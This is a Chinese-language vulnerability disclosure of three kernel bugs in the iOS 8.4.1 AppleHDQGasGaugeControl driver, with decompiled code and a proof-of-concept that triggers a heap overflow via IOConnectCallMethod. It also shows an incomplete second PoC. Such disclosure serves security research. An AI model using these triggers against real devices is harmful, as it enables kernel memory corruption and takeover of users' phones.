在逆向分析及审计iOS内核的过程我们发现com.apple.driver.AppleHDQGasGaugeControl模块的代码质量非常糟糕。我们将在本文中公布三个针对最新发行版本的iOS系统（8.4.1）内核漏洞的细节。这其中有一个非常容易利用的堆溢出，使得攻击者能够利用这一个漏洞来绕过所有的iOS内核溢出缓解机制，达到执行任意内核代码的目的。


1
7号函数中存在栈溢出漏洞


处理函数接受三个整数输入和一个整数输出。通过下面的代码片段中可以看到，由于没对inputScalar[1]做任何的检查，当inputScalar[1]的数值非常大的时候，循环内的代码会不断的往栈上写数据从而造成栈溢出。

14号函数中存在内存越界读写的漏洞

该处理函数不需要任何入参，但是会处理共享内存中的相关数据。在我们的Blackhat 议题 https://www.blackhat.com/us-15/briefings.html#review-and-exploit-neglected-attack-surfaces-in-ios-8 中也讨论了共享内存相关的潜在问题，通过调用IOConnectMapMemory打开共享内存，用户态就可以控制内存中的数据。通过观察start函数来看共享内存的初始化过程。


v8 = (IOBufferMemoryDescriptor *)IOBufferMemoryDescriptor::withOptions(0x10000, 4096, 1);

*(_DWORD *)(v2 + 100) = v8;

if ( v8 )

{

mapAddr = (void *)(*(_DWORD (__cdecl **)(IOBufferMemoryDescriptor *))(*(_DWORD *)v8 + 220))(v8);

*(_DWORD *)(v2 + 104) = mapAddr; // object+104 保存了内存的虚拟地址

bzero_130(mapAddr, 0x1000u);

*(_DWORD *)(*(_DWORD *)(v2 + 104) + 20) = 339; // memory+20 存储了对象的最大个数


该内存被用于存储一个数组，该数组的对象长度是12字节，因此4KB的共享内存最多能存储339个对象。我们进一步看下函数如何处理共享内存的。


mapAddr = *(_DWORD *)(self + 104); // 读取共享内存的虚拟地址

// 对339取模来保存写入的位置在内存范围

v9 = sub_80CF4A20(*(_QWORD *)(mapAddr + 16), *(_QWORD *)(mapAddr + 16) >> 32);

v10 = v9;

v11 = mapAddr + 12 * v9 // v11 可能指向共享内存之外

*(_BYTE *)(v11 + 28) = v7;

v11 += 28;

*(_BYTE *)(v11 + 3) = BYTE3(v7);

*(_BYTE *)(v11 + 2) = (unsigned int)v7 >> 16;

*(_BYTE *)(v11 + 1) = BYTE1(v7);

*(_QWORD *)(v11 + 4) = *(_QWORD *)(mapAddr + 8); // 写入的内容可控


该漏洞的根源在于驱动信任了共享内存中保存的数据，而该数据很容易被用户态程序修改。假设我们能够知道共享内存的地址（通过其它信息泄露漏洞），我们能够控制v11的值指向任意12字节对齐的内核地址。然后通过该漏洞就可以向该任意内核地址写入8字节数据。具体参见panic2代码。


void panic2(io_connect_t connection)

{

12号函数中存在堆溢出漏洞


该处理函数的输入是一个整形及一个结构体，同时要求inputScalar[0] <= 3 以及 (inputStructSize & 7) == 0。具体分析有漏洞的代码：

分析代码可以看到在循环中按8字节检查数据，如果遇到-1就跳出，随后会根据实际要处理的数据个数去分配内存。当最后进行内存拷贝的时候，长度却是用户传入的结构体的真实长度，从而造成了堆溢出。


这是一个非常完美的堆溢出，我们可以控制：

  • 被溢出的堆的大小可控，从而能攻击任意的kalloc区域

  • 堆溢出后覆盖的数据内容和大小都可控


结合vm_map_copy的堆风水技巧，该漏洞可以绕过所有的iOS内核溢出缓解机制。POC代码如下：


void panic3(io_connect_t connection)

{

uint64_t inputScalar[1];

uint8_t structData[1024];

uint32_t structSize = 1024;

inputScalar[0] = 0;

memset(structData, 0x88, sizeof(structData));

*(uint32_t *)&structData[4] = 1;

*(uint32_t *)&structData[4+8] = 0xFFFFFFFF; // 标识结束

IOConnectCallMethod(connection, 12, inputScalar, 1, structData, structSize, NULL, NULL, NULL, NULL);

}
